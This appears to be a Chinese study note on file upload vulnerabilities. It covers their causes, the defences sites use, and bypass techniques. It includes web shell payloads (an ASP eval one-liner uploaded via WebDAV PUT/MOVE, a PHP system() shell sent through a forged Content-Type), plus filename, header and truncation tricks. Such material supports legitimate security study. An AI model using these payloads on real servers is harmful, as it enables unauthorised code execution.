# 文件上传漏洞

## 漏洞危害

1. 上传文件为web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。
2. 上传文件为flash策略文件crossdomain.xml,黑客可以绕过flash跨域请求的限制。
3. 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载。
4. 上传文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器上会作为脚本执行，被用于钓鱼和欺诈。

## 利用条件

1. 上传的文件能够被web容器解释执行。所以文件上传后所在的目录需要能被web容器所覆盖到。
2. 用户能够从web上访问这个文件。如果文件上传了，但用户无法通过web方式，或者无法让web容器解释这个脚本，那么也不能称之为漏洞。
3. 用户上传的文件若被安全检查，格式化，图片压缩，文件改名，内容编码过滤等改变了内容，则也可能导致攻击不成功。

## 漏洞成因

导致文件上传的漏洞的原因较多，主要包括以下几类：

1. 服务器配置不当
2. 开源编辑器上传漏洞
3. 本地文件上传限制被绕过
4. 过滤不严或被绕过
5. 文件解析漏洞导致文件执行
6. 文件路径截断

### 漏洞成因部分详解

- 服务器配置不当

当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传（IIS说明）开启WebDAV

对服务器发送OPTION包：

```http
OPTIONS / HTTP/1.1
  
Host: www.xxx.com
```

若返回的HTTP响应头中带有PUT、MOVE等方法时则可以确定服务器开启了WebDAV。

此时用PUT上传一个SHELL，但SHELL后缀不可以是可执行文件后缀。

```http
PUT /test.txt HTTP/1.1
Host: www.xxx.com
Content-Length: 23
   
<%eval request("a")%>
```

若服务器启用了“WebDAV”扩展，并且复选了“写入”，就可以写入txt文件了。

若服务器开启了“脚本资源访问”，可以用MOVE方法将txt后缀文件改成可执行文件的后缀。

```http
MOVE /test.txt HTTP/1.1
  
Host: www.xxx.com
  
Destination: http://www.xxx.com/shell.asp
```

若服务器关闭了“脚本资源访问”，可利用IIS解析漏洞来执行shell。

```http
MOVE /test.txt HTTP/1.1
  
Host: www.xxx.com
  
Destination: http://www.xxx.com/test.asp;.jpg
```

- 开源编辑器上传漏洞

很多开源的编辑器历史上都有不同的上传漏洞，可以用搜索引擎搜索一下。

- 本地文件上传限制被绕过

只在客户端浏览器上做了文件限制而没有在远程的服务器上做限制，只需要修改数据包就可以轻松绕过限制。

- 过滤不严或被绕过

有些网站上使用了黑名单过滤掉了一些关键的可执行文件脚本后缀等，但黑名单不全或者被绕过，导致可执行脚本文件被上传到服务器上，执行。

如在服务器后端过滤掉了后缀为.php的文件，但并没有过滤掉.php3等其他可执行文件脚本后缀，攻击者就可以上传带有其他的可执行文件脚本本后缀的恶意文件到服务器上。

常用的一些可执行的文件脚本的后缀

php、php2、php3、php5、phtml、asp、aspx、ascx、ashx、cer、jsp、jspx

在某些情况下由于管理员错误的服务器配置（将.html后缀的文件使用php进行解析等）会导致.html、.xml等静态页面后缀的文件也可被执行。

在上传文件保存磁盘为NTFS格式时可通过::$DATA绕过黑名单限制，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。

有时服务器只对第一个被上传的文件进行了检查，这时通过同时上传多个文件并将恶意文件掺杂进其中也可绕过服务器的过滤。

- 文件解析漏洞导致文件执行

当服务器上存在文件解析漏洞时，合法的文件名便可导致带有恶意代码的文件被执行，参见解析漏洞。

- 文件路径截断

在上传的文件中使用一些特殊的符号，使得文件被上传到服务器中时路径被截断从而控制文件路径。

常用的进行文件路径截断的字符如下 \0、?、%00

在可以控制文件路径的情况下，使用超长的文件路径也有可能会导致文件路径截断。

除了常见的检查文件名后缀的方法外，有的应用还会判断上传文件的文件头来验证文件的类型。因为为了绕过类似浏览器MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的php 等脚本代码附在文件头之后

但此时，仍需通过php 来解释此图片文件（后缀为php或者结合文件解析漏洞）才行。

### 防御绕过

#### 防御

客户端
1. 客户端javascript校验（一般只校验后缀名）

服务端

1. 文件头content-type字段校验（image/gif）
2. 文件内容头校验（GIF89a）
3. 后缀名黑名单校验
4. 后缀名白名单校验
5. 自定义正则校验

WAF设备校验（根据不同的WAF产品而定）

#### 绕过

##### 客户端（可能黑名单和白名单）

```html
<script type="text/javascript">
    function selectFile(fnUpload){
        var filename.toLowerCase().substr(filename.lsatIndexOF("."))
        if(mime!=".jpg")
            alert("请选择jpg格式的照片上传")；
            fnUpload.outerHTML=fnUpload.outerHTML
    }
```

只在客户端限制没在后端限制的话可以用burpsuite改包绕过。

##### 服务端

1. ##### content-type字段校验

这里以PHP代码为例，模拟web服务器端的校验代码

```PHP
<?php
        if($_FILES['userfile']['type'] != "image/gif")  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。
                {   
                 echo "Sorry, we only allow uploading GIF images";
                 exit;
                 }
         $uploaddir = 'uploads/';
         $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
         if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile))
             {
                 echo "File is valid, and was successfully uploaded.\n";
                } else {
                     echo "File uploading failed.\n";
    }
     ?>
```

注：enctype 属性规定在将表单数据发送到服务器之前如何对其进行编码。决定content-type字段的值。

或者是浏览器嗅探有可能决定content-type。（存疑还需要查资料）

注：文件被上传后，默认地会被储存到服务端的默认临时目录中，除非
php.ini 中的 [upload_tmp_dir](http://php.net/manual/zh/ini.core.php#ini.upload-tmp-dir)
设置为其它的路径。服务端的默认临时目录可以通过更改 PHP
运行环境的环境变量 TMPDIR 来重新设置

我们可以通过抓包，将content-type字段改为image/gif

```http
POST /upload.php HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: TE, close
Host: localhost
User-Agent: libwww-perl/5.803
Content-Type: multipart/form-data; boundary=xYzZY//image/gif
Content-Length: 155
--xYzZY
Content-Disposition: form-data; name="userfile"; filename="shell.php"
Content-Type: image/gif (原为 Content-Type: text/plain)
<?php system($_GET['command']);?>
--xYzZY-
```

还有一种程序员通过getnamesize()获取图片宽、高信息不是图片的话获取不到。

可以将文件合并上传为php文件也可以解析

反正就是灵活运用通过判断网站cms查看源码来决定使用哪种方法。

- ##### 文件头绕过

在木马内容基础上再加了一些文件信息，有点像下面的结构
GIF89a<?php phpinfo(); ?>

- ##### 文件后缀名绕过

前提：黑名单校验
黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。
绕过方法：
（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类
（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类

白名单麻烦些只能通过文件解析漏洞（我知道的）来绕过，例如截断之类的

[文件解析]([http://thief.one/2016/09/21/服务器解析漏洞](http://thief.one/2016/09/21/服务器解析漏洞/))

- ##### 文件包含

特殊的文件包含（允许上传php等但是会检测其是否为木马）

前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。
绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?>
此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：

```php
#PHP    
<?php Include("上传的txt文件路径");?> 
#ASP    
<!--#include file="上传的txt文件路径" -->
#JSP    
<jsp:inclde page="上传的txt文件路径"/>
or  
<%@include file="上传的txt文件路径"%>
```

详细参考

[文件包含](https://thief.one/2017/04/10/2/)

- ##### 配合操作系统文件命令规则

1. 上传不符合windows文件命名规则的文件名

   　　test.asp.

   　　test.asp(空格)

   　　test.php:1.jpg

   　　test.php::$DATA

   　　shell.php::$DATA…….

   会被windows系统自动去掉不符合规则符号后面的内容。

2. linux下后缀名大小写

   在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。

测试